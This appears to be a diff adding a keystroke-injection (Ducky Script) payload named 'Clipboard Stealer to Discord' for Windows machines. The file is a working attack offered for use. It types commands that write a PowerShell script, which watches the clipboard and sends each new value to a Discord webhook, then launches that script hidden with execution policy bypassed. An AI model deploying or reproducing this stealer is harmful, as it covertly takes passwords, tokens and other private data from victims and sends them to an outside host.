@@ -1,0 +1,17 @@
+REM Title: Clipboard Stealer to Discord
+REM Author: 7h30th3r0n3
+REM Target: Windows 7/8/10/11
+REM Version: 1.1
+REM Category: Stealer
+REM Start clipboard-stealer that exfiltrates to Discord
+DELAY 500
+REM Open PowerShell with admin privileges
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+REM Create the PowerShell and bat script with clipboard stealing functionality
+STRING cd $env:TEMP;$psContent = 'Add-Type -AssemblyName System.Windows.Forms, System.Net.Http; $u="https://discord.com/api/webhooks/<token-api>"; $l=""; while ($true) { $c=[System.Windows.Forms.Clipboard]::GetText(); if ($c -ne $l) { $l=$c; $j=@{content=$c}|ConvertTo-Json; $h=[System.Net.Http.StringContent]::new($j,[System.Text.Encoding]::UTF8,"application/json"); [System.Net.Http.HttpClient]::new().PostAsync($u,$h).Result.EnsureSuccessStatusCode() }; sleep 1 }'; Set-Content -Path "clipboard-stealer.ps1" -Value $psContent;$batContent = '@echo off' + [char]10 + 'PowerShell -WindowStyle Hidden -Command "& {Start-Process PowerShell -ArgumentList ''-NoProfile -ExecutionPolicy Bypass -File ""%~dp0clipboard-stealer.ps1""'' -WindowStyle Hidden}"'; Set-Content -Path "launch.bat" -Value $batContent;Start-Process -NoNewWindow -FilePath ./launch.bat;exit
+ENTER
+
